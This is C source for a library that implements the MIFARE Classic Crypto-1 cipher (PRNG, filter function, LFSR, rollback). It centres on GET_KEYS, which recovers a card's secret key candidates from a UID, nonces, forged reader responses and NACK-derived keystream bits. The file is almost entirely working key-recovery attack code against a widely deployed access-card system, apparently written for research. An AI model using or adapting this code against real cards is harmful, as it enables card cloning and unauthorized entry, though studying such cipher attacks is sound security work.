#include <stdio.h>
#include <malloc.h>
#include "LibSimMiFare.h"
//#include "mex.h"
//=====================================================================================================================
//	The random number generator (RNG)
//=====================================================================================================================
//input
//	seed: initial states of the RNG internal states
//	step: how many bits (ticks) the RNG rolls
//
//output
//	The pseudo-random number generated. It should have the format of:
//		(MSB of 32bit uint) <------------------------------------------------------------------------------> (LSB of 32bit uint)
//		b7,b6,b5,b4,b3,b2,b1,b0, b15,b14,b13,b12,b11,b10,b9,b8, b23,b22,b21,b20,b19,b18,b17,b16, b31,b30,b29,b28,b27,b26,b25,b24
//	where b0 is the early generated bits and b31 is late generated bits.
#define REV8(x)		((((x)>>7)&1)^((((x)>>6)&1)<<1)^((((x)>>5)&1)<<2)^((((x)>>4)&1)<<3)^((((x)>>3)&1)<<4)^((((x)>>2)&1)<<5)^((((x)>>1)&1)<<6)^(((x)&1)<<7))
#define REV16(x)	(REV8 (x)^(REV8 (x>> 8)<< 8))
#define REV32(x)	(REV16(x)^(REV16(x>>16)<<16))
U32 RNG(U32 seed, U32 step)
{
	U32	i,x;
	x = REV32(seed);
	for (i = 0; i < step; i++) x=(x<<1)+(((x>>15)^(x>>13)^(x>>12)^(x>>10))&1);
	return REV32(x);
}

//=====================================================================================================================
//The 20bit non-linear function
//=====================================================================================================================
#define SBIT(n)	(47-n)	//to get the nth bit of LFSR state register
#define I4(x,a,b,c,d)	((U32)((((x)>>SBIT(a))&1)+(((x)>>SBIT(b))&1)*2+(((x)>>SBIT(c))&1)*4+(((x)>>SBIT(d))&1)*8))
#define F4A (U32)0x9E98
#define F4B (U32)0xB48E
#define F5C (U32)0xEC57E80A
U32 NF20(U64 state)
{
	U32		I5;	
	I5 = ((F4B >> I4 (state, 9,11,13,15)) & 1)* 1
	   + ((F4A >> I4 (state,17,19,21,23)) & 1)* 2
	   + ((F4A >> I4 (state,25,27,29,31)) & 1)* 4
	   + ((F4B >> I4 (state,33,35,37,39)) & 1)* 8
	   + ((F4A >> I4 (state,41,43,45,47)) & 1)*16;	
	return (F5C >> I5) & 1;
}

#define SBIT_(n)	(19-n)
#define I4_(x,a,b,c,d)	((U32)((((x)>>SBIT_(a))&1)+(((x)>>SBIT_(b))&1)*2+(((x)>>SBIT_(c))&1)*4+(((x)>>SBIT_(d))&1)*8))
U32 NF20_odd(U32 odd)
{
	U32		I5;	
	I5 = ((F4B >> I4_(odd,0,1,2,3)) & 1)* 1
	   + ((F4A >> I4_(odd,4,5,6,7)) & 1)* 2
	   + ((F4A >> I4_(odd,8,9,10,11)) & 1)* 4
	   + ((F4B >> I4_(odd,12,13,14,15)) & 1)* 8
	   + ((F4A >> I4_(odd,16,17,18,19)) & 1)*16;	
	return (F5C >> I5) & 1;
}

//=====================================================================================================================
//The Linear feedback function
//=====================================================================================================================
U32 LF18(U64 state)
{
return  (((state >>  SBIT(0)) ^ (state >>  SBIT(5)) ^ (state >>  SBIT(9)) 
		^ (state >> SBIT(10)) ^ (state >> SBIT(12)) ^ (state >> SBIT(14))
		^ (state >> SBIT(15)) ^ (state >> SBIT(17)) ^ (state >> SBIT(19)) 
		^ (state >> SBIT(24)) ^ (state >> SBIT(25)) ^ (state >> SBIT(27))
		^ (state >> SBIT(29)) ^ (state >> SBIT(35)) ^ (state >> SBIT(39))
		^ (state >> SBIT(41)) ^ (state >> SBIT(42)) ^ (state >> SBIT(43))) & 1);
}

//=====================================================================================================================
//The Crypto-1 cipher that produces 1 bit
//=====================================================================================================================
U32 CRYPTO1_bit(U64 *state, U32 in_bit, FEEDBACK fdbk)
{
	U64		x = *state;
	U32		lf, nf;
	
	lf = LF18(x);
	nf = NF20 (x);
	x = (x<<1) ^ ((in_bit ^ (fdbk&1?lf:0) ^ (fdbk&2?nf:0)));
	*state = x & (U64)(0xFFFFFFFFFFFF);
	return nf;
}

//=====================================================================================================================
//The Crypto-1 cipher that produces 32 bits
//=====================================================================================================================
#define BIT(x,n)		(((x)>>(n))&1)
U32 CRYPTO1_32(U64 *state, U32 in_32bit, FEEDBACK fdbk)
{
	U32		i, o;	
	for (i = 0, o = 0; i < 32; i++) 
		o += CRYPTO1_bit(state, BIT(in_32bit,i^24), fdbk) << (i^24);
	return o;
}

//=====================================================================================================================
//The Crypto-1 cipher that produces 4 bits
//=====================================================================================================================
U32 CRYPTO1_4(U64 *state, U32 in_4bit, FEEDBACK fdbk)
{
	U32		i, o;	
	for (i = 0, o = 0; i < 4; i++) 
	{
		o += CRYPTO1_bit(state, BIT(in_4bit,i), fdbk) << (i);
	}
	return o;
}

//=====================================================================================================================
//Non-linear output function reverse
//=====================================================================================================================
//input
//num: Used to show how many items are in output.
//ks3: pointer to a array of 8 of 4-bit ks3^NACK.
//
//output
//	A pointer to memory that stores all possible states.These are the LFSR states when ks3 last bit (bit3) is GENERATED.
//	Note that GENERATED means the state bit that generates ks3 bit3 has already been shifted leftward 
//	and a new bit 47 has been filled in.

U64 *NF20_REV(U32 *num, U32 *ks3)
{	//SDIST are the pre-calculated values of S1^S2, given different nR1 and nR2,(only changes last 3 bits), and nR1^nR2=0, 1, 2...7.
	//don't make a copy and past error on these numbers, or everything goes wrong.
	//this sequence corrisponds to xor the base nR_ks1 by 0, 1, 2, 3, 4, 5, 6, 7. (nR1^nR2 = 0, 1, ...7)
	//it doesn't necessarily follow the 000, 001, 010, 011, 100, 101, 110, 111 order.
	static const U64 SDIST[8]={0, 290845781021, 145422890510, 422721051155, 72711445255, 357995575066, 211360525577, 491804410132};

	U32 ks3_odd[8], ks3_even[8], SDIST_ODD[8], SDIST_EVEN[8], n_odd, n_even, i,j,k, n, s_even, s_odd;

	U64 *states, tmp;

	//allocate 2^21 bytes memory (index from 0 to 2^21-1)
	U8 *odd=malloc((1<<21)*sizeof(U8));
	U8 *even=malloc((1<<21)*sizeof(U8));
	//fill whole array with 1
	for(i=0;i<(1<<21);i++)
	{
		odd[i]=1;
		even[i]=1;
	}
	//
	//In ks3, bit0 is generated first. bit3 is generated last.
	//
	//Get ks3 bit0 and bit2. these bits are generated for state bit S5, S9, ... S45.
	//		bit0 is generated by S5...S43
	//		bit2 is generated by S7...S45
	//		ks3_even stored bit0 and bit3
	//		S5...S45 filter result will be stored in odd[i]
	//
	//Get ks3 bit1 and bit3. these bits are generated for state bit S6, S8, ... S46.
	//		bit1 is generated by S6...S44
	//		bit3 is generated by S8...S46
	//		ks3_odd stored bit1 and bit3
	//		S6...S46 filter result will be stored in even[i]
	//
	for(i=0;i<8;i++)
	{
		//separate ks3 odd and even bits
		ks3_odd[i]	=((ks3[i]>>1)&1) + (((ks3[i]>>3)&1)<<1);//[bit3, bit1]
		ks3_even[i]	=((ks3[i])&1) + (((ks3[i]>>2)&1)<<1);//[bit0, bit2]

		//separate SDIST odd and even bits
		//SDIST_EVEN includes S6, S8, ... S46 bit differences
		//SDIST_ODD includes S5...S45 bit differences
		for(n=0, SDIST_EVEN[i]=0, SDIST_ODD[i]=0; n<21; n++)
		{
			SDIST_EVEN[i]	+= ((SDIST[i]>>(2*n+1))&1)<<n;//this gets S6...S46
			SDIST_ODD[i]	+= ((SDIST[i]>>(2*n+2))&1)<<n;//this gets S5...S45
		}
	}
	
	for(i=0;i<8;i++)
	{
		//reduce 2^21 possible even state bits to 2^5 number, this is one round of filtering.
		n_even = NF20_DIST_FILTER(even, ks3_odd[i], SDIST_EVEN[i]);
		//reduce 2^21 possible even state bits to 2^5 number, this is one round of filtering.
		n_odd = NF20_DIST_FILTER(odd, ks3_even[i], SDIST_ODD[i]);
		//if at any round, we found no results, then exit.
		if(n_even==0 || n_odd==0)
		{
			*num=0;
			free(odd);
			free(even);
			return NULL;
		}
		
	}
	
	//mexPrintf("Even bits result num: %d\r\n", n_even);
	//mexPrintf("Odd bits result num: %d\r\n", n_odd);
	//allocate space for return results
	*num=n_even*n_odd*(1<<6); //21bit + 21bit + 6bit = 48bit
	states = malloc((*num) * sizeof(U64));
	
	//fill in the return results into allocated memory
	for(i=0,s_even=0; i<n_even; i++, s_even++)
	{
		//find the i-th possible even bits in 'even'
		while(even[s_even]!=1) s_even++;
		//after this, s_even stores the i-th possible even bits S6...S46

		//mexPrintf("even bits result found: %x\r\n", s_even);
		for(j=0,s_odd=0; j<n_odd; j++, s_odd++)
		{
			//find the j-th possible odd bits in 'odd'
			while(odd[s_odd]!=1) s_odd++;
			//after this, s_odd stores the j-th possible odd bits S5...S45
			//mexPrintf("odd bits result found: %x\r\n", s_odd);
			//merge even and odd bits and get S5,S6...S46
			for(n=0,tmp=0; n<21; n++)
			{
				tmp += (((U64)(s_even>>n)&1)<<(2*n+1)) + (((U64)(s_odd>>n)&1)<<(2*n+2));
			}
			//after this, tmp now stores the S5,S6...S46 bits

			//use tmp as basis to fill the next 2^6=64 values in 'states'
			for(k=0; k<(1<<6); k++)
			{
				//merge S0,S1,S2,S3,S4 into states, as the highest 5 bits
				//merge S47 into it, as the lowest bit
				states[(i*n_odd + j)*(1<<6)+k] = tmp + ((U64)(k & 0x3E)<<42) + (k & 1);
				//mexPrintf("Modified index: %d\r\n", (i*n_odd + j)*(1<<6)+k);
			}
		}
		
	}
	//free useless memory blocks at last
	free(odd);
	free(even);
	//return value
	return states;
}

//=====================================================================================================================
//Non-linear output filtering
//=====================================================================================================================
//This function uses the known distance value to filter through 8 ks3 nonces.
//
//input
//	result:		pointer to result array (2^21 bytes)
//	ks3_hlf:	1 in the 8 of ks3 nonce, only even bits or odd bits
//	dist:		1 in the 8 of unsigned 64bit integer, indicating the state distance among 8 states that generates ks3 nonces.
//
//output
//	Number of results left == 1 after this round of filtering.
U32 NF20_DIST_FILTER(U8 *result, U32 ks3_hlf, U32 dist)
{
	U32 i,num, tmp;
	for(i=0,num=0;i<(1<<21);i++)
	{
		if(result[i]==1)
		{
			tmp=i^dist;
			if(ks3_hlf == (NF20_odd(tmp)<<1) + NF20_odd(tmp>>1))
			{
				num++;
			}
			else
			{
				result[i]=0;
			}
		}
	}
	return num;
}

//=====================================================================================================================
//LFSR 1-bit roll back function
//=====================================================================================================================
//
//input
//	state:	LFSR register status before rollback
//	in_bit:	Input to the cipher
//	fdbk:	same meaning as in cipher function.
//
//output
//	The 1-bit keystream generated from the rollback.
U32 LFSRRB_1bit(U64 *state, U32 in_bit, FEEDBACK fdbk)
{
	U32 MSB, LSB, nf, lf;
	U64 x = *state;
	//get right most bit of state, which is generated from linear feedback
	LSB = x&1;

	//right shift "state" by one bit
	x>>=1;

	//calculate ks, this is the last generated ks bit before the current state.
	nf = NF20(x);

	//calculate the last step's linear feedback, this is the bit use to calculate the LSB ultimately.
	lf = LF18(x);

	// LSB = (the unknow state MSB)^ LF18((*state)>>1) ^ in_bit ^ ks
	MSB = LSB ^ in_bit ^ (fdbk&1?lf:0) ^ (fdbk&2?nf:0);
	
	//combine MSB and the right-shifted state.
	*state = (((U64)MSB<<47) + x) & (U64)(0xFFFFFFFFFFFF);

	return nf;
	
}

//=====================================================================================================================
//LFSR roll back function that handles 32bits
//=====================================================================================================================
U32 LFSRRB_32bit(U64 *state, U32 in_32bit, FEEDBACK fdbk)
{
	U32		i, o;	
	for (i = 0, o = 0; i < 32; i++) 
		o += LFSRRB_1bit(state, BIT(in_32bit,(31-i)^24), fdbk) << ((31-i)^24);
	return o;
}

//=====================================================================================================================
//LFSR roll back function that handles 4bits
//=====================================================================================================================
U32 LFSRRB_4bit(U64 *state, U32 in_4bit, FEEDBACK fdbk)
{
	U32		i, o;	
	for (i = 0, o = 0; i < 4; i++) 
	{
		o += LFSRRB_1bit(state, BIT(in_4bit,3-i), fdbk) << (3-i);
	}
	return o;
}

//=====================================================================================================================
//get all possible keys. This is the top level function that processes everything
//=====================================================================================================================
//
//input:
//	UID:	the 32-bit unique tag ID.
//	nT:		the 32-bit tag challendge
//	ks3:	the 8 ks3 we've got by varying last 3 bits of ks1^nR.
//	nR_ks1:	ks1^nR, the fake response we send to the card, last 3 bits are 0. (last 3 bits means bit 7, 6, 5.)
//	suc2nT_ks2:	ks2^suc2(nT), the fake response we send to the card.
//	ks_pb: the 8 parity bits of ks1^nR, ks2^suc2(nT), when last 3 bits of ks1^nR is 000. this is the encrypted parity bits.
//			Convention for ks_pb is: MSB stands for earlier bytes, LSB stands for later bytes.
//
//output:
//	num: number of possible keys in result
//	return value: all possible keys
U64* GET_KEYS(U32 UID, U32 nT, U32* ks3s, U32 nR_ks1, U32 suc2nT_ks2, U8 ks_pb, U32 *num)
{
	U64 *state, *key;
	U32 i,j, n=0, ks1, ks2, ks3, nR, suc2nT;
	U8 pb,pb1,tmp;
	
	//first get all possible states that generate the given ks3
	state = NF20_REV(&n, ks3s);

	//if there's no return value, we have to exit
	if(n == 0 && state == NULL)
	{
		*num=0;
		return state;
	}

	for(i=0, *num=0; i<n; i++)//debug purpose
	{
		//roll back each possible state
		ks3 = LFSRRB_4bit(&(state[i]),0,LINEAR);
		ks2 = LFSRRB_32bit(&(state[i]),0,LINEAR);
		ks1 = LFSRRB_32bit(&(state[i]),nR_ks1,BOTH);
		
		//use ks2, ks1 to de-cipher nR and suc2(nT)
		suc2nT = suc2nT_ks2 ^ ks2;
		nR = nR_ks1 ^ ks1;

		//calculate the parity from nR and suc2nT
		pb = PARITY(nR, suc2nT);//TBD

		//use ks3, ks2, ks1 to de-cipher the encrypted parity bits
		tmp =	  (ks3		& 1) + 
				 ((ks2		& 1)<<1) +
				(((ks2>>8)	& 1)<<2) +
				(((ks2>>16) & 1)<<3) +
				(((ks2>>24) & 1)<<4) +
				 ((ks1		& 1)<<5) +
				(((ks1>>8)	& 1)<<6) +
				(((ks1>>16) & 1)<<7);
		pb1 = ks_pb ^ tmp;

		//check parity bits
		if(pb == pb1)
		{
			//if parity is right, increase the number
			(*num)++;
		}
		else
		{
			//if parity wrong, set the highest bit of state[i] to 1, as a mark
			state[i] |= 0x8000000000000000;
		}
	}

	//if *num = 0, we should exit now
	if(*num == 0)
	{
		//*num=0;
		free(state);
		return NULL;
	}

	//allocate result array
	key = malloc((*num)*sizeof(U64));

	//fill in result array
	for(i=0, j=0; i<*num; i++, j++)
	{
		while(state[j] >= 0x8000000000000000)
		{
			j++;
		}//after this, state[j] is a possible correct state

		//rollback the j-th state
		LFSRRB_32bit(&(state[j]),UID^nT,LINEAR);

		//save it into key array
		key[i] = state[j];
	}

	free(state);
	return key;
}

U8 PARITY(U32 nR, U32 suc2nT)
{
	U64 allbytes = ((U64)nR<<32) + suc2nT;
	U8 result, i,j,tmp, parity;

	for(i=0, result=0; i<8; i++)
	{
		tmp = (allbytes >> i*8) & 0xFF;
		//MIFARE uses odd parity
		//parity = 1 is odd parity
		//parity = 0 is even parity
		for(j=0, parity=1; j<8; j++)
			parity ^= ((tmp>>j)&1);		
		result += (parity <<i);
	}
	
	return result;
}